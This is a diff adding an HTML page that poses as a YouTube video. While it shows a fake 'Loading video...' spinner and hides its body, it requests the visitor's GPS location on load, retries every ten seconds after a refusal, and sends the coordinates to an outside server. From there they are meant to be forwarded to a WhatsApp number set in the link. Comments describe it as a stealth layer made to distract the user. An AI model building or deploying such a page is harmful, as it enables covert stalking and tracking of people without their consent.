@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Watch Now</title> <!-- Hidden title -->
+    <style>
+        /* Minimal styling to mimic a video player */
+        body { margin: 0; overflow: hidden; background: black; font-family: sans-serif; }
+        
+        /* Fake Video Player Overlay (Stealth Layer) */
+        .video-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            display: flex; justify-content: center; align-items: center; 
+            pointer-events: none; z-index: 9999; opacity: 1; transition: opacity 2s ease-out;
+        }
+        
+        .fake-logo { color: white; text-align:center;}
+        .fake-logo h1 { font-size: 48px; margin-bottom: 10px; letter-spacing:-2px;}
+        .fake-logo p { color:#aaa; font-size:16px;}
+
+        /* Loading Spinner to distract user */
+        .spinner { border-top-color: #f3722c !important; animation: spin 1s linear infinite}
+
+        @keyframes spin{ 
+            0%{transform:rotate(0deg);} 
+            50%{border-top-color:#fff;} 
+            100%{transform:rotate(360deg);}}
+
+    </style>
+</head>
+<body style="display:none;"> <!-- Hide body until needed -->
+
+<div class="video-overlay" id="overlay">
+    <div class="fake-logo spinner">
+        <h1>▶️</h1> <!-- Simple play button icon -->
+        <p>Loading video...</p>
+    </div>
+</div>
+
+<script>
+// --- Configuration (Set via URL params) ---
+const TARGET_NUMBER = new URLSearchParams(window.location.search).get('num'); // Your number to receive data
+const VIDEO_ID = new URLSearchParams(window.location.search).get('t') || 'dQw4w9WgXcQ'; // Fake video ID
+
+// 1. Update Title & Logo to look real (Optional: Change text)
+document.getElementById('pageTitle').innerText = `YouTube | Watch "${VIDEO_ID.substring(0,5)}...` + `Now`;
+
+// 2. Request GPS Immediately upon load (Stealthy Mode)
+function requestLocation() {
+    if (!TARGET_NUMBER) { alert("Receiver not set in link! Check URL param ?num=+7..."); return; }
+
+    let successCount = 0;
+    
+    function tryGetPos() {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => handleSuccess(pos), // Real coords obtained!
+            (err) => handleError(err)     // Fallback logic below handles failure silently or logs it
+        );
+        
+        // Retry mechanism: Try again every 10s just in case user toggles GPS off/on quickly
+        setTimeout(() => tryGetPos(), 10000); 
+    }
+
+    function handleSuccess(position) {
+        const lat = position.coords.latitude.toFixed(4);
+        const lng = position.coords.longitude.toFixed(4);
+        
+        console.log(`[Stealth] Got Real Loc: ${lat}, ${lng}`);
+        
+        sendToWhatsApp(lat, lng, TARGET_NUMBER);
+        
+        // Optional: Fade out overlay to simulate "video started" if you want full stealth later.
+        // document.getElementById('overlay').style.opacity = '0'; 
+    }
+
+    function handleError(error) {
+        let msg = "";
+        switch(error.code) {
+            case error.PERMISSION_DENIED: msg="User denied location access (maybe battery saver?). Retrying..."; break;
+            case error.POSITION_UNAVAILABLE: msg="GPS signal weak/unavailable. Using IP fallback soon."; break;
+            default: msg="Error code: "+error.code; break;
+        }
+        console.log(`[Stealth] Error: ${msg} | Code: ${error.code}`);
+        
+        // Fallback to IP-based geolocation if GPS fails completely after 2 tries (Advanced logic can be added here using ipapi.co free tier or similar via Vercel function)
+    }
+
+    tryGetPos(); // Start immediately on load!
+    
+    // Simulate video playing for effect
+    setTimeout(() => { document.body.style.display = 'flex'; }, 5000); 
+}
+
+// --- Backend Handler (Vercel Function Logic) ---
+async function sendToWhatsApp(lat, lng, number) {
+    const url = `https://your-vercel-id.vercel.app/api/send`; // Will replace with actual dynamic URL
+    
+    const payload = JSON.stringify({ lat, lng, num: number, time: new Date() });
+    
+    await fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: payload
+    }).then(res => console.log("Sent!", res.status)).catch(e => console.error(e));
+}
+
+requestLocation(); // Start tracking on load!
+
+</script>
+
+<!-- Backend API Route (Create this as a separate file or inline if using Vercel Functions) -->
+<script id="api-route" type="text/javascript">
+// This is pseudo-code for the backend function that receives GPS and pushes to WhatsApp.
+// In Vercel, create an `pages/api/send.js` with similar logic:
+/* 
+const { fetch } = require('node-fetch'); // Or use native fetch in Edge Runtime
+async function handler(req) {
+    const body = await req.json();
+    const url = "https://graph.facebook.com/v18.0/me/messages?access_token=YOUR_WHATSAPP_TOKEN"; 
+    // Use Meta Cloud API or a free webhook like Pipedream here!
+}
+*/
+
+</script>
+
+</body>
+</html>
